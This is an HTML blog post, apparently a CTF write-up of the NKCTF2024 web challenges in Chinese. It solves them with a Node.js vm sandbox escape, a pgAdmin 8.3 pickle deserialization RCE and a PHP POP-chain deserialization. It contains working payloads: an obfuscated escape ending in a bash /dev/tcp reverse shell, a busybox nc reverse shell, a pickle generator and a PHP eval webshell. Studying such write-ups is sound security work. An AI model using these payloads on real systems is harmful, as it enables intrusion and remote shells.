@@ -1,0 +1,412 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>NKCTF2024 WP WEB | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1711466907097">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="NKCTF2024 WP WEB | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="my first cms
+CVE-2024-27622：https://github.com/capture0x/CMSMadeSimple/
+后台弱口令Admin/Admin123（你确定这是弱口令😡），进去打就行
+
+全世界最简单的CT..." />
+    <meta name="keywords" content="代码审计,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1711466907097" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              NKCTF2024 WP WEB
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-24
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/3Y4asDXPd/" class="post-tag">
+                  # 代码审计
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/nkctf2024-wp-web.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="my-first-cms">my first cms</h1>
+<p>CVE-2024-27622：<a href="https://github.com/capture0x/CMSMadeSimple/">https://github.com/capture0x/CMSMadeSimple/</a></p>
+<p>后台弱口令Admin/Admin123（你确定这是弱口令😡），进去打就行<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711285436294-8e10b8e4-d8bf-474f-bfaa-457150a6cba3.png" alt="image.png" loading="lazy"></p>
+<h1 id="全世界最简单的ctf">全世界最简单的CTF</h1>
+<p>Nodejs沙箱逃逸，sandbox为null的情况，参考：<a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQLpGDcnxArh70rD#toc-4">vm沙箱逃逸的一些其他情况</a></p>
+<pre><code class="language-javascript">function waf(code) {
+    let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g;
+    if(code.match(pattern)){
+        throw new Error(&quot;what can I say? hacker out!!&quot;);
+    }
+}
+
+app.post('/', function (req, res){
+        let code = req.body.code;
+        let sandbox = Object.create(null);
+        let context = vm.createContext(sandbox);
+        try {
+            waf(code)
+            let result = vm.runInContext(code, context);
+            console.log(result);
+        } catch (e){
+            console.log(e.message);
+            require('./hack');
+        }
+})
+</code></pre>
+<p><code>process</code>、<code>child_process</code>使用url编码绕过，<code>execSync</code>方法通过<code>Reflect.get</code>获取。直接反弹shell</p>
+<pre><code class="language-javascript">throw new Proxy({}, {
+    get: function(){
+        const cc = arguments.callee.caller;
+        const bb = decodeURIComponent('%72%65%74%75%72%6e%20%70%72%6f%63%65%73%73');
+        const cp = decodeURIComponent('%63%68%69%6c%64%5f%70%72%6f%63%65%73%73');
+        const es = decodeURIComponent('%65%78%65%63%53%79%6e%63');
+        const p = (cc.constructor.constructor(bb))();
+        const childProcess = p.mainModule.require(cp);
+        const e = Reflect.get(childProcess, es);
+        return e('bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/9898 0&gt;&amp;1&quot;').toString();
+    }
+})
+</code></pre>
+<p>get flag<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711285760550-2b597a2b-2f1e-477c-889e-40873cd6b14b.png" alt="image.png" loading="lazy"></p>
+<h1 id="attack">attack</h1>
+<p>pgAdmin8.3 RCE 参考：<a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">pgAdmin (&lt;=8.3) Path Traversal in Session Handling Leads to Unsafe Deserialization and Remote Code Execution (RCE)</a></p>
+<p>原理比较简单，在处理<code>pga4_session</code>（格式为<code>&lt;sid&gt;!&lt;digest&gt;</code>）的时候，程序会将<code>sid</code>所指的文件读取并使用pickle反序列化。这道题给了登录用户tacooooo@qq.com/tacooooo，Storage Manager上传为位置为<code>../storage/tacooooo_qq.com/</code>。题目没有bash和curl，通过本地对漏洞的复现知道了Storage Manager上传的绝对路径可能为<code>/var/lib/pgadmin/storage/tacooooo_qq.com/</code>，那就可以把命令执行的结果写到这个目录下，然后下载。</p>
+<p>解题流程如下：</p>
+<ul>
+<li>使用脚本生成<code>skky.pkl</code></li>
+</ul>
+<pre><code class="language-javascript">import struct
+
+def produce_pickle_bytes(platform, cmd):
+    b = b'\x80\x04\x95'
+    b += struct.pack('L', 22 + len(platform) + len(cmd))
+    b += b'\x8c' + struct.pack('b', len(platform)) + platform.encode()
+    b += b'\x94\x8c\x06system\x94\x93\x94'
+    b += b'\x8c' + struct.pack('b', len(cmd)) + cmd.encode()
+    b += b'\x94\x85\x94R\x94.'
+    print(b)
+    return b
+
+
+cmd = &quot;ls / &gt;&gt; /var/lib/pgadmin/storage/tacooooo_qq.com/result&quot;
+content = produce_pickle_bytes('posix', f&quot;{cmd}&quot;)
+with open('skky.pkl', 'wb') as f:
+    f.write(content)
+</code></pre>
+<ul>
+<li>登录用户选择Tools &gt; Storage Manager上传pkl</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/nkctf2024/1711286776522-21a7a65f-0b57-4ec8-8509-5e5780c33bd4.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>构造<code>Cookie: pga4_session=../storage/tacooooo_qq.com/skky.pkl!a</code>访问触发反序列化</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/nkctf2024/1711286849342-acf60a09-fc3d-4401-9a3b-deb275d17be4.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>下载result查看执行结果</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/nkctf2024/1711286909606-6e387c32-477c-4f8c-89d0-941b507c1cfa.png" alt="image.png" loading="lazy"></figure>
+<p>执行<code>ls -la /bin/sh</code>发现有busybox</p>
+<pre><code>lrwxrwxrwx    1 root     root            12 Jan 26 17:53 /bin/sh -&gt; /bin/busybox
+</code></pre>
+<p>可以用busybox提供的nc弹一个sh的shell</p>
+<pre><code>/bin/busybox nc xxxxxx 9999 -e /bin/sh
+</code></pre>
+<p>最后在/run.sh进程的环境变量中找到flag <code>cat /proc/1/environ</code><br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711189736765-fcc768f0-ed30-4f31-aec2-40d5f6f1c742.png" alt="image.png" loading="lazy"></p>
+<h1 id="用过就是熟悉">用过就是熟悉</h1>
+<p>打开源码，找到提示文件<code>app/controller/user/think/hinthinthinthinthinthinthint.php</code>。全局搜索文件名称<code>hinthinthinthinthinthinthint.php</code>，在<code>app/controller/user/think/Testone.php</code>中有将<code>hinthinthinthinthinthinthint.php</code>的<code>$content</code>写入的功能</p>
+<pre><code class="language-php">&lt;?php
+
+namespace think;
+header('Content-Type: text/html; charset=UTF-8');
+abstract class Testone
+{
+
+    //The end of the unserialize.
+    public function countTxtFiles($directory) {
+        $txtFiles = glob($directory . '/*.txt');
+        foreach ($txtFiles as $txtFile) {
+            if (is_file($txtFile)) {
+                unlink($txtFile);
+            }
+        }
+    }
+
+
+    public function __call($name, $arguments)
+    {
+        $a = time();
+        if ($arguments[0]['time']==='10086'){
+            $this-&gt;countTxtFiles(&quot;./app/controller/user/think/&quot;);
+            include('./app/controller/user/think/hinthinthinthinthinthinthint.php');
+            file_put_contents('./app/controller/user/think/'.md5($a),$content);
+        }
+    }
+}
+</code></pre>
+<p>同时，处理登录处存在反序列化<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711277351912-1d16e8a2-5cc7-4e82-b388-e2c1a9333bbd.png" alt="image.png" loading="lazy"></p>
+<p>POP链构造不是很复杂，需要注意的就是namespace和Testone的实现类</p>
+<pre><code>windows::__destruct -&gt; removeFiles() -&gt; collection::__toString -&gt; view::__get -&gt; Debug::__call
+</code></pre>
+<p>POP构造如下：</p>
+<pre><code class="language-php">&lt;?php
+namespace think\process\pipes;
+use think\Collection;
+
+class Windows {
+    public function __construct()
+    {
+        $this-&gt;fileHandles = [];
+        $this-&gt;files = [new Collection()];
+    }
+}
+
+
+namespace think;
+class Collection{
+    public function __construct()
+    {
+        $this-&gt;items = new View();
+    }
+
+}
+
+namespace think;
+class View{
+    public function __construct()
+    {
+        $this-&gt;data = array(&quot;Loginout&quot; =&gt; new Debug());
+        $this-&gt;engine = array(&quot;time&quot; =&gt;&quot;10086&quot;);
+    }
+}
+
+namespace think;
+class Debug {
+}
+
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+// TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoyOntzOjExOiJmaWxlSGFuZGxlcyI7YTowOnt9czo1OiJmaWxlcyI7YToxOntpOjA7TzoxNjoidGhpbmtcQ29sbGVjdGlvbiI6MTp7czo1OiJpdGVtcyI7TzoxMDoidGhpbmtcVmlldyI6Mjp7czo0OiJkYXRhIjthOjE6e3M6ODoiTG9naW5vdXQiO086MTE6InRoaW5rXERlYnVnIjowOnt9fXM6NjoiZW5naW5lIjthOjE6e3M6NDoidGltZSI7czo1OiIxMDA4NiI7fX19fX0=
+</code></pre>
+<p>使用guest登录<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711282961591-50fb0980-8adb-4569-9ea7-58ca8c59e7f9.png" alt="image.png" loading="lazy"></p>
+<p><code>Testone</code>写的文件名称为<code>md5(time())</code>，返回的<code>timeNow</code>记录了处理登录的时间戳。因为<code>time()</code>返回时间是秒级的，而这两个操作的时间间隔不到秒级，所以可以用登录的<code>timeNow</code>来计算文件名称。</p>
+<pre><code class="language-php">echo md5(&quot;1711282943&quot;);	// d1ff1f67b68695a5fb4521be6aa8cd3f
+</code></pre>
+<p>访问<code>/app/controller/user/think/1711283010d1ff1f67b68695a5fb4521be6aa8cd3f</code>拿到hint，内容大致如下：</p>
+<pre><code>......
+
+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;我曾听说，密码的明文，加上心爱之人的名字(Chu0)，就能够听到游客的心声。&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
+
+......
+
+POST /?user/index/loginSubmit HTTP/1.1
+Host: 192.168.128.2
+Content-Length: 162
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://192.168.128.2
+Referer: http://192.168.128.2/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: kodUserLanguage=zh-CN; CSRF_TOKEN=xxx
+Connection: close
+
+name=guest&amp;password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI&amp;rememberPassword=0&amp;salt=1&amp;CSRF_TOKEN=xxx&amp;API_ROUTE=user%2Findex%2FloginSubmit
+
+hint: 新建文件
+</code></pre>
+<p>这里会发现前段提交的 password 会被 js 编码一次，而后端在校验前会对其进行解码<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711283456977-72862e10-ffbd-41f4-b75b-af3b2f0457c1.png" alt="image.png" loading="lazy"></p>
+<p>直接复制解码代码得到明文，同时根据提示得到密码：<code>!@!@!@!@NKCTFChu0</code>。登录guest账户，回收站中的<code>新建文件.html</code>应该就是前面hint所指的<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711283736123-b9c9e25d-6330-498c-a4b1-d2fceebe9d25.png" alt="image.png" loading="lazy"></p>
+<p>其中给出了shell文件<code>/data/files/shell</code></p>
+<pre><code class="language-html">/var/www/html/data/files/shell
+
+&lt;?php eval($_POST['0']); ?&gt;
+</code></pre>
+<p>虽然这里可以文件上传，但显然是传不了shell的（难不成让你挖0day？）。结合提示的内容往文件包含的思路想。全局搜索<code>include(</code>，不难找到在<code>app/controller/user/think/Config.php</code>存在反序列化利用点，和开始一样在一个<code>__call</code>中<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711284239327-814f7493-7160-4cbd-9d61-8f7c309e9222.png" alt="image.png" loading="lazy"></p>
+<p>修改之前POP链的部分</p>
+<pre><code class="language-php">namespace think;
+class View{
+    public function __construct()
+    {
+        $this-&gt;data = array(&quot;Loginout&quot; =&gt; new Config());
+        $this-&gt;engine = array(&quot;name&quot; =&gt;&quot;./../../../../../../var/www/html/data/files/shell&quot;);
+    }
+}
+
+namespace think;
+class Config{}
+</code></pre>
+<p>弹shell<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711285079747-69f6863c-86d6-41de-a173-d9a074b8852f.png" alt="image.png" loading="lazy"></p>
+<p>getflag<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711285117697-cbe41945-91ea-4980-a2a5-f241479f32e9.png" alt="image.png" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#my-first-cms">my first cms</a></li>
+<li><a href="#%E5%85%A8%E4%B8%96%E7%95%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84ctf">全世界最简单的CTF</a></li>
+<li><a href="#attack">attack</a></li>
+<li><a href="#%E7%94%A8%E8%BF%87%E5%B0%B1%E6%98%AF%E7%86%9F%E6%82%89">用过就是熟悉</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/teng-long-bei-ctf-wp/">
+              <h3 class="post-title">
+                腾龙杯CTF WP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
